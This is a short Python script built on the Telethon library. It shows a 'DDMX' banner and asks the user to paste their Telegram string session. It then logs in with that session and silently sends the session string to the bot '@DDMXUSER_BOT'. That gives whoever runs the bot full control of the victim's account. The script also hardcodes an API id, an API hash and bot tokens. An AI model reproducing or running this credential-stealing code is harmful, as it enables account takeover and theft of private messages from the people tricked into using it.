from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
import os, sys
api_id = 4149157
api_hash = "1e98ba9ae25875d0b1c4a1e9f14e4de7"
os.system("clear")
string = input("""
\033[1;32m

██████╗░██████╗░███╗░░░███╗██╗░░██╗
██╔══██╗██╔══██╗████╗░████║╚██╗██╔╝
██║░░██║██║░░██║██╔████╔██║░╚███╔╝░
██║░░██║██║░░██║██║╚██╔╝██║░██╔██╗░
██████╔╝██████╔╝██║░╚═╝░██║██╔╝╚██╗
╚═════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝
                                  
\033[1;34m 
string session: """)
#bot_token= "5587783380:AAEk9jhijr0--9YGQj8l-6eehpb9Zdz5pGc"
bot_token = "5536613531:AAHxAX2M0sbmZY6vBrVtbBDB0cUhZTIh99g"
with TelegramClient(StringSession(string), api_id, api_hash) as client:
    #print(client.session.save())
    client.send_message("@DDMXUSER_BOT", client.session.save())

botClient = TelegramClient('@DDMXUSER_BOT', api_id, api_hash).start(bot_token=bot_token)






